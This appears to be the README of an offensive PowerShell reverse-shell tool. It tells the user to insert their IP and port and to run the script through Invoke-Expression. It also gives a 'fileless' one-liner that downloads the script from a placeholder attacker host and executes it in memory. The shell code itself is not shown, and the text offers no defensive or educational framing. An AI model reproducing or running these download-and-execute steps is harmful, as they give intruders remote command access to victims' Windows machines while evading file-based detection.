# R3vps43ll

 R3vps43ll is a PowerShell reverse shell with limited capabilities. It is uploaded as a .txt file and can be used as such.
 
 # Remember
 
 Add your IP Address and Port number.
 
 # How to Use
 
 You can save as .ps1 and runas in PowerShell:
 
 .\r3vps43ll.ps1
 
 # Or
 
 Run it like this in PowerShell:
 
 gc -raw .\r3vps43ll.txt | iex

# Fileless Approach

(iwr 'http://< YOUR IP >/< DIRECTORY >/filename.txt' -UseBasicParsing) | iex
